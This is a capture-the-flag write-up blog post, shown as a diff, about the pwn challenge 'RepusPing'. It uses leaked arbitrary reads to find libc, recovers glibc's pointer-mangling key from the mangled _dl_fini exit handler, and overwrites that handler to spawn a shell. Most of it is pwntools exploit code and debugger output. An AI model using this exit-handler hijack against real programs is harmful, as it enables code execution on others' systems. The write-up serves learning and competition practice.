@@ -1,0 +1,620 @@
+Source: https://blog.davidherm.es/posts/repusping
+
+# RepusPing: MntcrlCTF 2026
+2026-07-08
+4 min read
+exit_func
+Table of Contents
+Last week, my team and I played our final competition in the
+CyberCup
+tournament, the
+MntcrlCTF 2026
+. I really liked this challenge because it serves as a perfect “Baby-Exitfuncs” scenario to refresh my knowledge about this technique.
+warning
+Exit functions are an extensive topic. This challenge simplifies things by giving us a straightforward exploitation path, but I highly suggest reading my previous post to get a solid grasp of how these functions work internally before continuing. (
+exit_function blogpost
+)
+The Code
+The source code is quite simple. We have a
+win()
+function (our target) and the
+main
+function:
+int
+main
+()
+{
+int
+i
+;
+//
+[rsp+4h] [rbp-1Ch]
+_QWORD
+*
+num
+;
+//
+[rsp+8h] [rbp-18h] BYREF
+__int64 v5
+;
+//
+[rsp+10h] [rbp-10h] BYREF
+unsigned
+__int64 canary
+;
+//
+[rsp+18h] [rbp-8h]
+canary
+=
+__readfsqword
+(
+0x
+28
+u
+)
+;
+puts
+(
+"
+Here's a little gift
+"
+)
+;
+printf
+(
+"
+%#016lx
+\n
+"
+,
+ld_sample
+)
+;
+puts
+(
+"
+I'll give you a gift, enter a number
+"
+)
+;
+for
+(
+i
+=
+0
+;
+i
+<=
+2
+;
+++
+i
+)
+{
+__isoc23_scanf
+(
+"
+%ld
+"
+,
+&
+num
+)
+;
+printf
+(
+"
+%#016lx
+\n
+"
+,
+*
+num
+)
+;
+}
+puts
+(
+"
+No more gifts now!
+"
+)
+;
+__isoc23_scanf
+(
+"
+%ld
+"
+,
+&
+num
+)
+;
+__isoc23_scanf
+(
+"
+%ld
+"
+,
+&
+v5
+)
+;
+*
+num
+=
+v5
+;
+exit
+(
+0
+)
+;
+}
+The first thing the program does is hand us a free pointer to the first byte of the dynamic loader (
+ld
+) mapped area. Then, it grants us three arbitrary address reads by letting us input an address and printing its contents. Finally, it gives us one arbitrary address write before calling
+exit(0)
+.
+So, what can we overwrite to get a shell? I’ve already spoiled it, but looking at the
+checksec
+output confirms our path: Full RELRO means the GOT is read-only, and the
+exit(0)
+at the end renders standard return address overwrites useless since the function never actually returns. Furthermore, that
+ld
+pointer leak is a massive hint. Notice that the executable is not PIE, so the address of our win function is fixed.
+Getting the info we need
+First, we can find the position of libc by looking for a pointer to it in the loader-mapped area. This can be easily done using the
+p2p
+pwndbg command:
+pwndbg
+>
+p2p ld libc
+0
+0
+:
+0
+000
+│
+0x
+7ffff7ffca28
+—▸
+0x
+7ffff7e6d5e0
+(
+realloc
+)
+◂— push r15
+0
+0
+:
+0
+000
+│
+0x
+7ffff7ffca30
+—▸
+0x
+7ffff7e6cc90
+(
+malloc
+)
+◂— test rdi
+,
+rdi
+0
+0
+:
+0
+000
+│
+0x
+7ffff7ffca38
+—▸
+0x
+7ffff7e6d240
+(
+free
+)
+◂— test rdi
+,
+rdi
+0
+0
+:
+0
+000
+│
+0x
+7ffff7ffca40
+—▸
+0x
+7ffff7e6dc00
+(
+calloc
+)
+◂— mov rax
+,
+rdi
+0
+0
+:
+0
+000
+│
+0x
+7ffff7ffca48
+—▸
+0x
+7ffff7e61380
+(
+pthread_mutex_unlock
+)
+◂— mov esi
+,
+1
+0
+0
+:
+0
+000
+│
+0x
+7ffff7ffca50
+—▸
+0x
+7ffff7e5f8d0
+(
+pthread_mutex_lock
+)
+◂— mov edx
+,
+dword ptr
+[
+rdi
++
+0x
+10
+]
+0
+0
+:
+0
+000
+│
+0x
+7ffff7ffdbc0
+—▸
+0x
+7ffff7dc7000
+◂—
+0x
+3010102464c457f
+We can calculate the distance between
+ld
+and the address within the loader where the
+calloc
+pointer is stored. By adding this offset to our
+loader_leak
+variable, we can request the actual address of
+calloc
+.
+Once we have that address, we subtract
+calloc
+’s internal offset to calculate the real libc base address.
+loader_leak
+=
+int
+(
+r
+.
+recvline
+()
+,
+16
+)
+calloc_leak_pos
+=
+loader_leak
++
+0x
+35a28
+r
+.
+sendline
+(
+bstr
+(
+calloc_leak_pos
+))
+libc_addr
+=
+int
+(
+r
+.
+recvline
+()
+,
+16
+)
+-
+libc
+.
+sym
+.
+calloc
+aleak
+(
+"
+libc_base
+"
+,
+libc_addr
+)
+Now we can choose how we want to get the mangling key. I decided not to read the key directly, but rather to reverse the mangling math. For this, we need to read the already-mangled
+_dl_fini
+pointer from the
+initial
+exit function list, which is always registered by default.
+In this challenge, the target was running a Debian glibc version, and my
+pwninit
+script didn’t fetch the debug symbols, so I couldn’t just grab the offset via
+libc.symbols.initial
+. Instead, I decided to dynamically break at
+exit
+and inspect the arguments passed to
+__run_exit_handlers
+.
+0x7f02944ae090
+<exit>
+sub
+rsp
+,
+8
+0x7f02944ae094
+<exit+
+4
+>
+mov
+ecx
+,
+1
+ECX
+=>
+1
+0x7f02944ae099
+<exit+
+9
+>
+mov
+edx
+,
+1
+EDX
+=>
+1
+0x7f02944ae09e
+<exit+
+14
+>
+lea
+rsi
+, [
+rip
++
+0x1a45db
+]
+RSI
+=>
+0x7f0294652680
+—▸
+0x7f0294653fe0
+◂—
+0
+0x7f02944ae0a5
+<exit+
+21
+>
+call
+0x7f02944ade00
+#__run_exit_handlers
+In this case,
+0x7f0294653fe0
+is the address of
+initial
+. By subtracting the glibc base from it, we get the exact offset we need:
+exit_funcs
+=
+libc_addr
++
+0x
+1e8fe0
+aleak
+(
+"
+exit_funcs_list
+"
+,
+exit_funcs
+)
+Now, we can read the mangled address:
+r
+.
+sendline
+(
+bstr
+(
+exit_funcs
++
+0x
+18
+))
+mangled_dl_fini
+=
+int
+(
+r
+.
+recvline
+()
+.
+strip
+()
+,
+16
+)
+vleak
+(
+"
+mangled _dl_fini pointer
+"
+,
+mangled_dl_fini
+)
+Finally, to recover the key, we just need to calculate the real address of
+_dl_fini
+. Since we already leaked the loader base earlier, this is trivial.
+def
+get_key
+(
+encoded
+,
+real
+)
+:
+return
+ror
+(
+encoded
+,
+0x
+11
+,
+64
+)
+^
+real
+_dl_fini
+=
+loader_leak
++
+23552
+key
+=
+get_key
+(
+mangled_dl_fini
+,
+_dl_fini
+)
+vleak
+(
+"
+key
+"
+,
+key
+)
+We have three arbitrary reads available, but we’ve only used two. Since we don’t need any additional information to build our exploit, you can point this last read anywhere.
+r
+.
+sendline
+(
+bstr
+(
+exit_funcs
+))
+r
+.
+recvuntil
+(
+b
+"
+No more gifts now!
+\n
+"
+)
+Overwriting _dl_fini
+Now we can finish our exploit by calculating the mangled
+win
+address:
+def
+mangle_exit
+(
+pointer
+,
+key
+)
+:
+return
+rol
+(
+pointer
+^
+key
+,
+0x
+11
+,
+64
+)
+win
+=
+exe
+.
+sym
+.
+win
+mangled_win
+=
+mangle_exit
+(
+win
+,
+key
+)
+vleak
+(
+"
+mangled_win
+"
+,
+mangled_win
+)
+Next, we use our single arbitrary write to overwrite the existing mangled
+_dl_fini
+pointer. Because our
+win
+function doesn’t require any arguments, we don’t need to worry about controlling the argument pointer, even though the
+ef_cxa
+flavor technically allows for it.
+r
+.
+send
+(
+bstr
+(
+exit_funcs
++
+0x
+18
+)
++
+b
+"
+"
+)
+r
+.
+sl
+(
+bstr
+(
+mangled_win
+))
+r
+.
+interactive
+()
+And with this, we get a shell.
